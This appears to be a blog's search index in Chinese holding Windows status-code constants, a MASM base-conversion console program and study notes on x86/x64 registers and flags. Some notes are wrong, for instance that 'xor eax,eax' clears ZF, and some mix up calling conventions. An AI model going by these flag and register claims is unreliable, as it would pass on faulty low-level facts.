EXCEPTION_FLT_STACK_CHECK STATUS_FLOAT_STACK_CHECK //0xC0000092#define EXCEPTION_FLT_UNDERFLOW STATUS_FLOAT_UNDERFLOW //0xC0000093#define EXCEPTION_INT_DIVIDE_BY_ZERO STATUS_INTEGER_DIVIDE_BY_ZERO //0xC0000094#define EXCEPTION_INT_OVERFLOW STATUS_INTEGER_OVERFLOW //0xC0000095#define EXCEPTION_PRIV_INSTRUCTION STATUS_PRIVILEGED_INSTRUCTION //0xC0000096#define EXCEPTION_IN_PAGE_ERROR STATUS_IN_PAGE_ERROR //0xC0000006#define EXCEPTION_ILLEGAL_INSTRUCTION STATUS_ILLEGAL_INSTRUCTION //0xC000001D#define EXCEPTION_NONCONTINUABLE_EXCEPTION STATUS_NONCONTINUABLE_EXCEPTION //0xC0000025#define EXCEPTION_STACK_OVERFLOW STATUS_STACK_OVERFLOW //0xC00000FD#define EXCEPTION_INVALID_DISPOSITION STATUS_INVALID_DISPOSITION //0xC0000026#define EXCEPTION_GUARD_PAGE STATUS_GUARD_PAGE_VIOLATION //0xC0000001#define EXCEPTION_INVALID_HANDLE STATUS_INVALID_HANDLE //0xC0000008#define EXCEPTION_POSSIBLE_DEADLOCK STATUS_POSSIBLE_DEADLOCK //0xC000#define CONTROL_C_EXIT STATUS_CONTROL_C_EXIT //0xC000013A#define STATUS_WAIT_0 ((DWORD )0x00000000L) #define STATUS_ABANDONED_WAIT_0 ((DWORD )0x00000080L) #define STATUS_USER_APC ((DWORD )0x000000C0L) #define STATUS_TIMEOUT ((DWORD )0x00000102L) #define STATUS_PENDING ((DWORD )0x00000103L) #define DBG_EXCEPTION_HANDLED ((DWORD )0x00010001L) #define DBG_CONTINUE ((DWORD )0x00010002L) #define STATUS_SEGMENT_NOTIFICATION ((DWORD )0x40000005L) #define STATUS_FATAL_APP_EXIT ((DWORD )0x40000015L) #define DBG_REPLY_LATER ((DWORD )0x40010001L) #define DBG_TERMINATE_THREAD ((DWORD )0x40010003L) #define DBG_TERMINATE_PROCESS ((DWORD )0x40010004L) #define DBG_CONTROL_C ((DWORD )0x40010005L) #define DBG_PRINTEXCEPTION_C ((DWORD )0x40010006L) #define DBG_RIPEXCEPTION ((DWORD )0x40010007L) #define DBG_CONTROL_BREAK ((DWORD )0x40010008L) #define DBG_COMMAND_EXCEPTION ((DWORD )0x40010009L) #define DBG_PRINTEXCEPTION_WIDE_C ((DWORD )0x4001000AL) #define STATUS_GUARD_PAGE_VIOLATION ((DWORD )0x80000001L) #define STATUS_DATATYPE_MISALIGNMENT ((DWORD )0x80000002L) #define STATUS_BREAKPOINT ((DWORD )0x80000003L) #define STATUS_SINGLE_STEP ((DWORD )0x80000004L) #define STATUS_LONGJUMP ((DWORD )0x80000026L) #define STATUS_UNWIND_CONSOLIDATE ((DWORD )0x80000029L) #define DBG_EXCEPTION_NOT_HANDLED ((DWORD )0x80010001L) #define STATUS_ACCESS_VIOLATION ((DWORD )0xC0000005L) #define STATUS_IN_PAGE_ERROR ((DWORD )0xC0000006L) #define STATUS_INVALID_HANDLE ((DWORD )0xC0000008L) #define STATUS_INVALID_PARAMETER ((DWORD )0xC000000DL) #define STATUS_NO_MEMORY ((DWORD )0xC0000017L) #define STATUS_ILLEGAL_INSTRUCTION ((DWORD )0xC000001DL) #define STATUS_NONCONTINUABLE_EXCEPTION ((DWORD )0xC0000025L) #define STATUS_INVALID_DISPOSITION ((DWORD )0xC0000026L) #define STATUS_ARRAY_BOUNDS_EXCEEDED ((DWORD )0xC000008CL) #define STATUS_FLOAT_DENORMAL_OPERAND ((DWORD )0xC000008DL) #define STATUS_FLOAT_DIVIDE_BY_ZERO ((DWORD )0xC000008EL) #define STATUS_FLOAT_INEXACT_RESULT ((DWORD )0xC000008FL) #define STATUS_FLOAT_INVALID_OPERATION ((DWORD )0xC0000090L) #define STATUS_FLOAT_OVERFLOW ((DWORD )0xC0000091L) #define STATUS_FLOAT_STACK_CHECK ((DWORD )0xC0000092L) #define STATUS_FLOAT_UNDERFLOW ((DWORD )0xC0000093L) #define STATUS_INTEGER_DIVIDE_BY_ZERO ((DWORD )0xC0000094L) #define STATUS_INTEGER_OVERFLOW ((DWORD )0xC0000095L) #define STATUS_PRIVILEGED_INSTRUCTION ((DWORD )0xC0000096L) #define STATUS_STACK_OVERFLOW ((DWORD )0xC00000FDL) #define STATUS_DLL_NOT_FOUND ((DWORD )0xC0000135L) #define STATUS_ORDINAL_NOT_FOUND ((DWORD )0xC0000138L) #define STATUS_ENTRYPOINT_NOT_FOUND ((DWORD )0xC0000139L) #define STATUS_CONTROL_C_EXIT ((DWORD )0xC000013AL) #define STATUS_DLL_INIT_FAILED ((DWORD )0xC0000142L) #define STATUS_CONTROL_STACK_VIOLATION ((DWORD )0xC00001B2L) #define STATUS_FLOAT_MULTIPLE_FAULTS ((DWORD )0xC00002B4L) #define STATUS_FLOAT_MULTIPLE_TRAPS ((DWORD )0xC00002B5L) #define STATUS_REG_NAT_CONSUMPTION ((DWORD )0xC00002C9L) #define STATUS_HEAP_CORRUPTION ((DWORD )0xC0000374L) #define STATUS_STACK_BUFFER_OVERRUN ((DWORD )0xC0000409L) #define STATUS_INVALID_CRUNTIME_PARAMETER ((DWORD )0xC0000417L) #define STATUS_ASSERTION_FAILURE ((DWORD )0xC0000420L) #define STATUS_ENCLAVE_VIOLATION ((DWORD )0xC00004A2L) #define STATUS_INTERRUPTED ((DWORD )0xC0000515L) #define STATUS_THREAD_NOT_RUNNING ((DWORD )0xC0000516L) #define STATUS_ALREADY_REGISTERED ((DWORD )0xC0000718L)","tags":["Windows","Anti_Dbg"],"categories":["Reverse"]},{"title":"x86汇编 CRT标准库","path":"/re4mile/2021/06/07/language/Asm/windwos/32/小专题/CRT标准库/language/","content":"参考链接https://blog.csdn.net/huangxy10/article/details/8310087 https://www.cnblogs.com/cloudeman/archive/2012/04/09/2439438.html 其实也就是我们在汇编语言中,可以调用很多C语言的函数 比如下面涉及的函数 123stdio.hstdlib.hstring.h 常用的CRT函数 123456789crt_memcpycrt_memsetcrt_strcpycrt_systemcrt_printfcrt_scanfcrt_fopencrt_gets... 其实涉及的很多的函数例子你就都可以加上crt_前缀,然后尝试一下可不可以正常使用该函数 能用,当然就万事大吉啦 实践 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405.386.model flat,stdcalloption casemap:none;sub2 proto StdCall,:DWORD,:DWORD; small_check proto uses esi ebx ecx,:DWORD; numToDec proto :DWORD,:DWORD ,:DWORD; weclome proto ; f_Out proto ; f_In proto ; Ymain proto include windows.incinclude msvcrt.incinclude user32.incinclude kernel32.inc includelib msvcrt.libincludelib user32.libincludelib kernel32.lib .datasz_1 db &quot;--------------------------------------------&quot;,0Ah,00hsz_2 db &quot;convert xx from xx to xx&quot;,0Ah,00hsz_3 db &quot;if you want convert 100 from 10 to 16&quot;,0Ah,00hsz_4 db &quot;than input like below&quot;,0Ah,00hsz_5 db &quot;In [0]: 64 16 10&quot;,0Ah,00hsz_6 db &quot;Out[0]: 100&quot;,0Ah,00hsz_7 db &quot;In [1]: c&quot;,0Ah,00hsz_8 db &quot;Out[1]: clear screen...&quot;,0Ah,00hsz_9 db &quot;In [2]: q&quot;,0Ah,00hsz_10 db &quot;Out[2]: good byte...&quot;,0Ah,00hsz_11 db &quot;--------------------------------------------&quot;,0Ah,00hsz_info1 db &quot;In [&quot;,00Hsz_info2 db &quot;Out[&quot;,00Hsz_format1 db &quot;%s%d]: &quot;,00Hsz_format2 db &quot;%s&quot;,0AH,0AH,00Hsz_Pause db &quot;pause&quot;,00hsz_Cls db &quot;cls&quot;,00hsz_goodbye db &quot;good byte...&quot;,00hsz_inputwrong db &quot;input wrong&quot;,00Hsz_Hex db &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXZ&quot;,00Hsz_input db 128 dup(0)h_Output dd 0cnt_step dd 0.codef_inputWrong proc invoke crt_memset,offset sz_input,0,128 invoke crt_strcpy,offset sz_input,offset sz_inputwrong retf_inputWrong endpsmall_check proc uses esi ebx ecx,lp_cur:DWORD LOCAL @bool_check1:DWORD LOCAL @bool_check2:DWORD LOCAL @bool_check3:DWORD mov @bool_check1,0 mov @bool_check2,0 mov @bool_check3,0 mov esi,lp_cur movzx eax,byte ptr [esi] mov ebx,eax mov eax,ebx sub eax,030H .if eax &gt;=0 .if eax&lt;10 mov @bool_check1,1 .endif .endif mov eax,ebx sub eax,041H .if eax &gt;=0 .if eax &lt;6 mov @bool_check2,1 .endif .endif mov eax,ebx sub eax,061H .if eax &gt;=0 .if eax &lt;6 mov @bool_check3,1 .endif .endif mov eax,@bool_check1 shl eax,2 mov ebx,@bool_check2 shl ebx,1 mov ecx,@bool_check3 or eax,ebx or eax,ecx retsmall_check endpnumToDec proc in_sz_param:DWORD , in_dw_base:DWORD , out_dw_Param:DWORD LOCAL @sz_tmp[128]:BYTE lea eax,@sz_tmp invoke crt_memset,eax,0,128;memset(sz_tmp, 0, 128); mov ebx,out_dw_Param mov dword ptr [ebx],0 ; *out_dw_Param = 0; mov esi,in_sz_param mov ecx,0 .while byte ptr [esi+ecx]!=0 mov ebx,esi add ebx,ecx invoke small_check,ebx mov ebx,eax mov eax,ebx and eax,4 .if eax !=0 ;数字 movzx eax,byte ptr [esi+ecx] sub eax,030H mov byte ptr [esi+ecx],al jmp L4 .endif mov eax,ebx and eax,2 .if eax !=0 ;大字母 movzx eax,byte ptr [esi+ecx] sub eax,037H mov byte ptr [esi+ecx],al jmp L4 .endif mov eax,ebx and eax,1 .if eax !=0 ;小写字谜 movzx eax,byte ptr [esi+ecx] sub eax,057H mov byte ptr [esi+ecx],al jmp L4 .endif L4: mov ebx,in_dw_base .if eax&gt;=ebx invoke f_inputWrong ret .endif inc ecx .endw xor eax,eax xor edx,edx .while eax&lt;ecx movzx ebx,byte ptr [esi+eax] push eax xor eax,eax mov eax,edx add eax,ebx mov ebx,in_dw_base mul ebx mov edx,eax pop eax inc eax .endw mov eax,edx xor edx,edx div in_dw_base mov ebx,out_dw_Param mov dword ptr [ebx],eax retnumToDec endp;ExitProcess PROTO, dwExitCode:DWORD DecToNum proc in_sz_param:DWORD, dw_src_base:DWORD,dw_dst_base:DWORD LOCAL @sz_tmp[128]:BYTE LOCAL @dw_tmp:DWORD lea eax,@sz_tmp invoke crt_memset, eax,0,128 ; memset(sz_tmp, 0, 128); lea eax,@dw_tmp invoke numToDec , in_sz_param,dw_src_base, eax ;numToDec(in_sz_param, dw_src_base, &amp;dw_tmp);//把第一个东西转化为10进制 .if @dw_tmp==0 ret .endif xor ecx,ecx mov edx,@dw_tmp mov esi,offset sz_Hex lea edi ,@sz_tmp .while edx!=0 mov eax,edx push edx xor edx,edx mov ebx,dw_dst_base div ebx ;eax..edx mov bl,byte ptr [esi+edx] mov byte ptr [edi+ecx],bl pop edx mov edx,eax inc ecx .endw push ecx invoke crt_memset,offset sz_input ,0,128 ;memset(input, 0, 128); pop ecx lea esi ,@sz_tmp mov edi ,offset sz_input mov eax,0 .while eax&lt;ecx mov ebx,ecx dec ebx sub ebx,eax mov dl,byte ptr [esi+ebx] mov ebx,eax mov byte ptr [edi+eax],dl inc eax .endw retDecToNum endpweclome proc invoke SetConsoleTextAttribute ,h_Output , 0DH invoke crt_printf , offset sz_1 invoke crt_printf , offset sz_2 invoke crt_printf , offset sz_3 invoke crt_printf , offset sz_4 invoke crt_printf , offset sz_5 invoke crt_printf , offset sz_6 invoke crt_printf , offset sz_7 invoke crt_printf , offset sz_8 invoke crt_printf , offset sz_9 invoke crt_printf , offset sz_10 invoke crt_printf , offset sz_11 retweclome endpf_Out proc mov esi,offset sz_input mov edi ,offset cnt_step .if byte ptr [esi] != 00H invoke SetConsoleTextAttribute,h_Output,0AH ;SetConsoleTextAttribute(h_Output, 0xA); invoke crt_printf , offset sz_format1 , offset sz_info2, cnt_step ;printf(&quot;%s%d]: &quot;, sz_info2, cnt_step); ;cnt_step++; mov eax , dword ptr [edi] inc eax mov dword ptr [edi],eax invoke SetConsoleTextAttribute,h_Output,0FH ;SetConsoleTextAttribute(h_Output, 0xF); invoke crt_printf , offset sz_format2,offset sz_input ;printf(&quot;%s &quot;, input); .endif retf_Out endpf_In proc LOCAL @cnt:dword LOCAL @num:dword LOCAL @src_base:dword LOCAL @dst_base:dword LOCAL @lp_src_base:dword LOCAL @lp_dst_base:dword invoke SetConsoleTextAttribute ,h_Output , 0AH ;SetConsoleTextAttribute(h_Output, 0xA); invoke crt_printf , offset sz_format1, offset sz_info1, cnt_step ;printf(&quot;%s%d]: &quot;, sz_info1, cnt_step); invoke SetConsoleTextAttribute ,h_Output , 0FH ;SetConsoleTextAttribute(h_Output, 0xF); invoke crt_gets ,offset sz_input ; fgets(input, 128, stdin); mov esi,offset sz_input .if byte ptr [esi] == 071H ; q invoke crt_memset,offset sz_input,0,128 ;memset(input, 0, 128); invoke crt_strcpy ,offset sz_input ,offset sz_goodbye;strcpy(input, &quot;good bye...&quot;); invoke f_Out;f_Out(); invoke SetConsoleTextAttribute ,h_Output , 0FH ;SetConsoleTextAttribute(h_Output, 0xF); invoke crt_exit,0;exit(0); .endif .if byte ptr [esi] == 063H ; c invoke crt_system ,offset sz_Cls;system(&quot;cls&quot;); invoke crt_memset ,offset sz_input,0,128 ;memset(input, 0, 128); invoke weclome;weclome(); ret .endif mov @cnt,1 ;mov dword ptr [ebp-4], 1 mov ecx,0 .while ecx&lt;128 mov ebx,esi add ebx,ecx invoke small_check,ebx push eax inc ebx invoke small_check,ebx push eax mov ebx,esi add ebx,ecx inc ebx mov eax,dword ptr [esp+4] .if eax!=0 mov eax,dword ptr [esp] .if eax==0 mov byte ptr [ebx],0 .if @cnt==3 .break .endif .endif .endif mov eax,dword ptr [esp+4] .if eax==0 mov eax,dword ptr [esp] .if eax!=0 .if @cnt==1 mov @lp_src_base,ebx mov ebx,@cnt inc ebx mov @cnt,ebx jmp L3 .endif .if @cnt==2 mov @lp_dst_base,ebx mov ebx,@cnt inc ebx mov @cnt,ebx jmp L3 .endif .endif .endifL3: add esp,8 inc ecx .endw mov eax,0 .if @lp_dst_base ==0 jmp L1 .endif .if @lp_src_base ==0 jmp L1 .endif jmp L2L1: mov eax,1L2: .if eax==1 invoke f_inputWrong ret .endif lea eax,@src_base invoke numToDec ,@lp_src_base,10,eax;numToDec(lp_src_base, 10,&amp;src_base); lea eax,@dst_base invoke numToDec ,@lp_dst_base,10,eax;numToDec(lp_dst_base, 10,&amp;dst_base); ;下面操作不是&amp; .if @src_base &gt; 1 .if @src_base &lt;35 .if @dst_base &gt;1 .if @dst_base &lt;35 invoke DecToNum , offset sz_input,@src_base,@dst_base .endif .endif .endif .else invoke f_inputWrong .endif retf_In endpYmain proc invoke GetStdHandle ,STD_OUTPUT_HANDLE mov h_Output,eax invoke weclome .while 1 invoke f_In invoke f_Out .endw retYmain endpSTART: invoke Ymain retend STARTend","tags":["Assembly","x86"],"categories":["Language"]},{"title":"x86汇编语言基础部分","path":"/re4mile/2021/06/07/language/Asm/windwos/32/基础/language/","content":"寄存器段寄存器 寄存器 功能 CS(code segment) 代码段地址寄存器，存放代码段的起始地址 DS(data segment) 数据段地址寄存器，存放数据段的起始地址 SS(stack segment) 堆栈段地址寄存器，存放堆栈段的起始地址 ES(extra segment) 附加段地址寄存器，存放附加段的起始地址 控制寄存器 IP(Instruction Pointer):指令指针寄存器，存放代码段中指令的偏移地址。 FR(Flags Register):标志寄存器，用于存放反映处理器和运行程序执行结果状态的控制标志和条件码标志。 x86寄存器8个通用寄存器：EAX、EBX、ECX、EDX、ESI、EDI、ESP、EBP 1个标志寄存器：EFLAGS 其他寄存器：EIP、TSC等 长度是32位寄存器 长度是16位寄存器 长度是8位寄存器 EAX AX AH、AL EBX BX BH、BL ECX CX CH、CL EDX DX DH、DL ESI SI EDI DI ESP SP EBP BP eax 累加器(Accumulator), 它的低16位即是AX，而AX又可分为高8位AH和低8位AL。 ebx 基地址寄存器(Base Register), 它的低16位即是BX，而BX又可分为高8位BH和低8位BL。 ecx 计数寄存器（Count Register），它的低16位即是CX，而CX又可分为高8位CH和低8位CL。 edx 数据寄存器（Data Register），它的低16位即是DX，而DX又可分为高8位DH和低8位DL。 ESI&#x2F;EDI:做源&#x2F;目标索引寄存器(Source&#x2F;Destination Index Register)，它们的低16位分别是SI、DI。 EBP&#x2F;BSP 基址针寄存器（Base Pointer Register）&#x2F;堆栈指针寄存器（Stack Pointer Register）， ​ 低16位是BP、SP，其内存分别放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶&#x2F;底部 eax 函数的返回值, ebx 主要用于在内存寻址时存放基地址 ecx 在循环和字符串操作时，要用它来控制循环次数； ​\t在位操作 中，当移多位时，要用CL来指明移位的位数； ​\t是重复(REP)前缀指令和LOOP指令的内定计数器 edx 在进行乘、除运算时，它可作为默认的操作数参与运算， ​\t也可用于存放I&#x2F;O的端口地址； ​\t且总是被用来放整数除法产生的余数。 esi&#x2F;edi 它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式， ​ 在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目标串。 ​ 此外，它们又作为通用寄存器可以进行任意的常规的操作，如加减移位或普通的内存间接寻址。 esp&#x2F;ebp: 主要用于存放堆栈内存储单元的偏移量，用它们可实现多种存储器操作数的寻址方式 ​ 指针寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 ​ 并且规定：BP为基指针(Base Pointer)寄存器用它可直接存取堆栈中的数据；SP为堆栈指针(Stack Pointer)寄存器， ​ 用它只可访问栈顶。在32位平台上，ESP每次减少4字节 x64寄存器x64 结构提供了 16 个通用寄存器（以后称为整数寄存器）， 16 个 XMM 寄存器 (注意xmm寄存器是128位,而不是64位) xmm寄存器主要用于浮点数处理 ymm寄存器 256位 寄存器名 寄存器简介 主要功能 64bit 32bit 16bit 8bit rax 累加器，是算术运算的主要寄存器 存储返回值 rax eax ax al rbx 基址寄存器，被调用者保存 存放存储区的起始地址 rbx ebx bx bl rcx 计数寄存器 循环操作和字串处理的计数控制；函数调用时的第4个参数 rcx ecx cx cl rdx I&#x2F;O指针 I&#x2F;O操作时提供外部设备接口的端口地址；函数调用时的第3个参数 rdx edx dx dl rsi (source index)源变址寄存器，与rds段寄存器联用，可以访问数据段中的任一个存储单元 函数调用时的第2个参数 rsi esi si sil rdi (destination index)目的变址寄存器，与res段寄存器联用，可以访问附加段中的任一个存储单元 函数调用时的第1个参数 rdi edi di dil rbp (base pointer)基址指针寄存器，用于提供堆栈内某个单元的偏移地址，与rss段寄存器联用，可以访问堆栈中的任一个存储单元，被调用者保存 rbp ebp bp bpl rsp (stack pointer)栈顶指针寄存器，提供堆栈栈顶单元的偏移地址，与rss段寄存器联用，以控制数据进栈和出栈 rsp esp sp spl r8 函数调用时的第5个参数 r8 r8d r8w r8b r9 函数调用时的第6个参数 r9 r9d r9w r9b r10 调用者保存 r10 r10d r10w r10b r11 调用者保存 r11 r11d r11w r11b r12 被调用者保存 r12 r12d r12w r12b r13 被调用者保存 r13 r13d r13w r13b r14 被调用者保存 r14 r14d r14w r14b r15 被调用者保存 r15 r15d r15w r15b 12movsd xmm0, qword ptr [rsi]movsd xmm1, qword ptr [rsi+8] 奇怪啊,奇怪 x64寄存器调用约定对于一般的函数传参,实际情况在调试的时候可以确定 参数位置 寄存器名字 参数1 rcx 参数2 rdx 参数3 r8 标志寄存器CF: 进位标志符号比 排在第0位PF: 奇偶标志 排在第2位AF: 辅助进位标志 排在第4位ZF: 零标志 排在第6位SF: 符号标志 排在第7位TF: 追踪标志 排在第8位IF: 中断允许标志 排在第9位DF: 方向标志 排在第10位OF: 溢出标志 排在第11位 对于上面的位置,我们不需要去记住 CF 无符号溢出无符号数溢出,无符号数进位 CF 把所有的数据都当作无符号的数来处理 Carry : 进位的意思 1:CY carry yes 0:NC not carry 1-2,发生了借位,CF&#x3D;&#x3D;1 1+9,发生了进位,CF&#x3D;1 进位后的数据被丢到了CF中 STC 让CF&#x3D;1 CLC 让CF&#x3D;0 CMC 让CF取反 123456789mov al,0x7fadd al,1不会引起CF改变inc al,更不会mvo al,0xffinc al 不会dec aladd al,1会引起改变 dec&#x2F;inc不会影响CF add&#x2F;adc指令对标志位的影响： ​\tCF&#x3D;1 最高有效位向高位有进位 ​\tCF&#x3D;0 最高有效位向高位无进位 sub&#x2F;sbb&#x2F;cmp 指令对标志位的影响： ​ CF&#x3D;1 二进制减法运算中最高有效位向高位有借位（被减数小于减数，不够减的情况） ​ CF&#x3D;0 二进制减法运算中最高有效为向高位无借位（被减数〉&#x3D;减数，够减的情况） neg ​\tCF&#x3D;1 不为0的操作数求补时 ​\tCF&#x3D;0 为0的操作数求补时 PF与奇偶性有关 parity:奇数与偶数,奇偶性 Evem : 偶数 Odd : 奇数 最低有效的8位有多少个1,而不是看所有的位 1: PE Parity_Evem,二进制中有偶数个1 0: PO parity_Odd ,二进制中有奇数个1 这是代表了一个二进制位数上的奇偶性质,数值本身的奇偶与这个标志位无关 add&#x2F;adc&#x2F;inc&#x2F;sub&#x2F;sbb&#x2F;dec&#x2F;cmp AF辅助进位标志AF(Auxiliary Carry Flag)： 在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： (1) 在 双字（dword）操作时，如eax,发生低字eal,向高字eah进位或借位时； (2)、在字（word）操作时，如ax,发生al低字节向高字节ah进位或借位时； (3)、在字节（byte）操作时如al，发生低4位向高4位进位或借位时 其规律就是数据宽度的一半向另外一半进位 123456MOV EAX,0X555EFFFF MOV AX,0X5EFF MOV AL,0X5FADD EAX,0X2 MOV AX,0X2 MOV AL,0X2 add&#x2F;adc&#x2F;inc&#x2F;sub&#x2F;sbb&#x2F;dec&#x2F;cmp ZF: Zero_Flag 与计算结果为0相关 1: ZR Zero 0: NZ not zero 1xor eax,eax add&#x2F;adc&#x2F;inc&#x2F;sub&#x2F;sbb&#x2F;dec&#x2F;cmp SF: Sign_Flag Sign : 符号,正负 Negativbe:,负数 Positive ;正数 符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。 1 : NG Negativbe_Large,负数 0 : PL Positive_Little ,正数 如果运算产生负数,SF&#x3D;1 12mov ah,0x7Fadd ah,1 add&#x2F;adc&#x2F;inc&#x2F;sub&#x2F;sbb&#x2F;dec&#x2F;cmp TF:追踪标志位trap flag 当TF&#x3D;1,cpu进入单步执行状态 每执行一条语句,产生一个中断请求 感觉可以在这里做一点文章… 该寄存器可以用于程序的调试 IF:interrupt enable flag 中断允许标志 中断允许标志用来决定cpu是否响应CPU外部可屏蔽中断发生的请求 对于不可以屏蔽的中断还有cpu内部发生的中断,他就没有办法了,必须响应 IF&#x3D;1,响应外部可屏蔽中断 IF&#x3D;0,不响应可屏蔽中断 STI 让IF&#x3D;1 CLI 让IF&#x3D;0 DFdirection_flag 方向位标志寄存器 指令std,cld可以修改它 STD 让DF&#x3D;1 表示- CLD 让DF&#x3D;0 表示+ 与movsb,movsw,movsd有关 串传送指令 OF 有符号溢出学习CF与OF，要始终牢记一点。 CF是无符号数溢出标志， OF是有符号数溢出标志。 一个无符号的byte,超过了255就是CF&#x3D;1 一个有符号的byte,超过了127,就是OF&#x3D;1 OF : Over_Flow 1 : OV over_flow 0 : NV not_over_flag OF把数据看作有符号来处理 超过max,小于min,就会OF&#x3D;1 123456xor eax, eaxmov al, 7Fh;127 上溢add al, 1xor eax, eaxmov al, 80h ; -128\t下溢sub al, 1 规律2个数相加 只有0x7F到0x80,才叫OF溢出 根据10进制本质的符号运算 正数+正数&#x3D;… 负数+负数&#x3D;… 正数[0,1&#x2F;2] 负数(1&#x2F;2,1) 那么正数+负数 (1&#x2F;2,3&#x2F;2) 那么是不会经过0x7F-&gt;0x80的 于是正数+负数是不会溢出的 CPU是如何让OF发生改变的 1000 0000 +1100 0000 8bit位,右边0开始计数 如果[7]发生了进位,那么ret&#x3D;1 如果[6]发生了进位,那么ret2&#x3D;0 如果ret1^ret2&#x3D;1,那么OF&#x3D;1 也就是ret1和ret2中只有一个位1的时候,OF&#x3D;1 add ​\tOF&#x3D;1 两个同符号数相加（正数+正数 或 负数+负数），结果符号与其相反。 ​\tOF&#x3D;0 两个不同符号数相加，或同符号数相加，结果符号与其相同。 adc&#x2F;inc ​ OF&#x3D;1 两个同符号数相加，结果符号与其相反， ​ OF&#x3D;0 两个同符号数相加，或同符号相加，结果符号与其相同 sub&#x2F;dec ​\tOF&#x3D;1 两数符号相反（正数-负数，或负数-正数），而结果符号与减数相同。 ​\tOF&#x3D;0 同符号数相减时，或不同符号数相减，其结果符号与减数不同。 neg ​\tOF&#x3D;1 操作数为-128（字节运算）或操作数为-32768（字运算） ​ OF&#x3D;0 当求补运算的操作数不为－128（字节）或－32768（字）时 IOPF :I&#x2F;O 特权标志 它可表示当前运行程序或者任务访问1&#x2F;0指令的特权级 若当前运行程序或者任务的特权级别cpl&lt;&#x3D;IPOL(00B)的时候,则可以执行I&#x2F;O指令,否则会发生异常 这里可以做文章 该值只能被允许与CPL&#x3D;0的程序或任务通过popf&#x2F;popfd指令或者iret指令进行修改 因此,一般用户程序(CPL&#x3D;3)是无法执行I&#x2F;O指令的 NTnested task flag NT&#x3D;1,表示当前任务嵌套于前一任务 否则当前任务不嵌套于任何任务 当执行call指令&#x2F;中断&#x2F;异常时,cpu让NT&#x3D;1 当任务执行返回时,通过iret让NT&#x3D;0 问题来了…调用一个call就让NT&#x3D;1,就这么随便吗? 另外NT&#x3D;0只能是iret吗? RF恢复标志位 resume flag 恢复标志位用于控制cpu是否接受指令断点的调试异常 若RF&#x3D;0,表示接受调试异常,否则不接受 该标志位一般友调试器设置,可以在刚进入调试异常的时暂时关闭新调试异常, 以避免调试异常时又立即进入了另外一个调试异常 VM :virtual-8086 mode flag 虚拟8086模式标志 若VM&#x3D;1,表示cpu进入了虚拟8086模式 否则进入了保护模式 AC :Algnment check flag 对齐检查标志位 若AC&#x3D;1, 且控制寄存器的cr0的AM标志位也为1,则允许内存地址进行对齐的检测 否则不允许 当程序的特权级别为3且运行于用户模式,若地址不对齐(即字访问时地址为奇数,双字访问时,地址不能被4整除),将产生对齐检查异常 之前我们只是提及过,寻址偶数地址会更加的快,国更加的发挥CPU的性能 CPU对非对齐字节地址访问内存,时间可能更加的长,若要求必须对齐,这要进行对齐检查 VIF :virtual interrupt flag 虚拟中断标志寄存器VIF为IF标志的虚拟印象, 问题来了 什么叫虚拟印象 这个标志位与VIP标志配合使用,允许多任务环境下应用程序有虚拟的系统IF标志 VIP:virtual interrupt pending flag 虚拟中断挂起标志 若vip&#x3D;1,表示有挂起的中断 否则没有挂起的中断 一般由软件对其标志位初始化或者复位 CPU仅仅是读取,他与VIF配合使用 ID :identification flag 识别标志位 若ID位能被置位或者复位,则说明CPU支持CPUID指令 CPUID可以提供CPU的厂商,系列号等信息 特殊的指令和flagMUL&#x2F;IMULMUL指令的条件码设置为： CF OF&#x3D;0 0 乘积的高一半为0（字节操作的（AH）或字操作的（DX）） CF OF&#x3D;1 1 乘积的高一半不为0 ​ IMUL指令的条件码设置为： CF OF&#x3D;0 0 乘积的高一半为低一半的符号扩展. CF OF&#x3D;1 1 其他情况 and指令对标志位的影响： ​ 指令执行后 CF 和 OF 置零，AF无定义。 ​ PF&#x3D;1 结果操作数中1的个数为偶数时置1 ​ PF&#x3D;0 结果操作数中1的个数为奇数时置0 or指令对标志位的影响： 令执行后 CF 和 OF 置零，AF无定义。 PF&#x3D;1 结果操作数中1的个数为偶数时置1 PF&#x3D;0 结果操作数中1的个数为奇数时置0 xor指令对标志位的影响： 执行后 CF 和 OF 置零，AF无定义。 PF&#x3D;1 结果操作数中1的个数为偶数时置1 PF&#x3D;0 结果操作数中1的个数为奇数时置0 1xor eax,eax zf=0 test指令对标志位的影响： 令执行后 CF 和 OF 置零，AF无定义。 PF&#x3D;1 结果操作数中1的个数为偶数时置1 PF&#x3D;0 结果操作数中1的个数为奇数时置0 逻辑左移 SHL指令对标志位的影响： CF&#x3D;移入的数值 OF&#x3D;1 当count&#x3D;1时，移动后最高位的值发生变化。 OF&#x3D;0 当count&#x3D;1时，移动时最高位的值未发生变化。 逻辑右移 SHR指令对标志位的影响：CF&#x3D;移入的数值 OF&#x3D;1 当count&#x3D;1时，移动后最高位的值发生变化。 OF&#x3D;0 当count&#x3D;1时，移动时最高位的值未发生变化。 算术左移 SAL指令对标志位的影响：CF&#x3D;移入的数值 OF&#x3D;1 当count&#x3D;1时，移动后最高位的值发生变化。 OF&#x3D;0 当count&#x3D;1时，移动时最高位的值未发生变化。 算术右移SAR指令对标志位的影响：CF&#x3D;移入的数值 OF&#x3D;1 当count&#x3D;1时，移动后最高位的值发生变化。 OF&#x3D;0 当count&#x3D;1时，移动时最高位的值未发生变化。 循环左移 ROL指令对标志位的影响：CF&#x3D;移入的数值 OF&#x3D;1 当count&#x3D;1时，移动后最高位的值发生变化。 OF&#x3D;0 当count&#x3D;1时，移动时最高位的值未发生变化。 循环右移 